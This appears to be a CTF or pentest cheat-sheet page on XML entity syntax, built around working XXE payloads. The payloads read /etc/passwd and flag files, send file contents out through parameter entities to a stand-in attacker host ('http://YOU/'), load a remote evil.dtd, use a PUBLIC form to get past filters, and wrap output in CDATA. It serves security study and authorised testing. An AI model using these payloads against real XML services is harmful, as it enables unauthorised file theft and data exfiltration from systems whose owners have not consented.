# Entity Basics — the syntax that everything else builds on

## The three entity kinds

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!-- internal general entity — literal value -->
  <!ENTITY name "VALUE">

  <!-- external general entity — read from URL/URI -->
  <!ENTITY ext SYSTEM "URI">

  <!-- parameter entity — only usable INSIDE the DTD -->
  <!ENTITY % param "DTD-fragment">
  %param;
]>
<root>&name; &ext;</root>
```

| Kind | Declared as | Used as | Where usable |
|---|---|---|---|
| Internal general | `<!ENTITY n "v">` | `&n;` | document body |
| External general | `<!ENTITY n SYSTEM "u">` | `&n;` | document body |
| Parameter | `<!ENTITY % n "...">` | `%n;` | DTD only |
| External parameter | `<!ENTITY % n SYSTEM "u">` | `%n;` | DTD only |
| Character | `&#65;` `&#x41;` | inline | body |

## The substitution rules that matter

- general entities substitute in the **document body** (element text,
  attribute values, not element names)
- parameter entities substitute **inside the DTD only**
- an external entity's URI may be `file://`, `http(s)://`, `ftp://`,
  `php://filter/...`, `jar:`, `netdoc:`, `gopher://`, `expect://` — the
  parser's protocol handlers decide — `protocol-handlers.md`
- `SYSTEM` keyword = external; `PUBLIC "id" "uri"` = external with a
  public-id fallback URI (also exploitable)
- `NDATA` — unparsed entities (rarely useful)

## The minimal working XXE — read a file

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

Response shows the file contents → classic XXE file-read.

## The parameter-entity trick — the building block of blind exfil

Parameter entities let you compose a DTD dynamically:

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % ex "<!ENTITY send SYSTEM 'http://YOU/?d=%file;'>">
  %ex;
]>
<r>&send;</r>
```

`%ex;` expands to a *declaration* of `&send;`, which resolves to a URL
containing the file content — the parser then fetches that URL to
expand `&send;` → your server receives the file in the request line.

## The external-parameter-entity form — cleaner blind exfil

```xml
<!DOCTYPE r [
  <!ENTITY % dtd SYSTEM "http://YOU/evil.dtd">
  %dtd;
]>
<r>&exfil;</r>
```

Your hosted `evil.dtd` does the file-read + exfil composition — keeps
the sent document tiny — `external-dtd.md`.

## `SYSTEM` vs `PUBLIC` — two external forms

```xml
<!ENTITY x SYSTEM "file:///flag">
<!ENTITY x PUBLIC "-//X//EN" "file:///flag">
<!ENTITY % x PUBLIC "-//X//EN" "http://YOU/e.dtd">
```

`PUBLIC` takes a public-id then a URI — same external read; useful when
`SYSTEM` is blocked by a naive filter.

## Nested entities — entities referencing entities

```xml
<!ENTITY a "first">
<!ENTITY b "&a;-second">
<!ENTITY c "&b;-third">
<r>&c;</r>   →  "first-second-third"
```

Used to build file content into a URL: `%file` holds the file content;
`%send` references `%file` inside a URL — the parser expands the chain.

## The CDATA wrapper — reading files that contain XML-special chars

A file containing `<`/`&` breaks entity substitution (the parser tries
to parse it). Wrap in CDATA via a parameter-entity concat:

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % end "]]>">
<!ENTITY % d "<!ENTITY cdata '%start;%file;%end;'>">
%d;
<r>&cdata;</r>
```

— `cdata-wrapping.md` has the full pattern.

## The `&#xNN;` character entities — smuggling bytes

`&#x3B;` is `;` — if a filter strips literal `;` but the parser
resolves char entities *before* the DOCTYPE is scanned... actually
char-entities inside ENTITY VALUES expand later — inside `<!ENTITY>`
values and inside element bodies:

```xml
<!ENTITY x "a&#x3B;b">
<r>&x;</r>  →  "a;b"
```

Useful for smuggling chars INTO the entity value, not for smuggling
metas past a DOCTYPE-level filter.

## Falsifiers

- internal entities don't substitute (`&probe;` literal in output)
  → entities are off — only XInclude-style routes remain (`xinclude.md`)

## Output to record

- which entity form resolved + which file/URL it reached
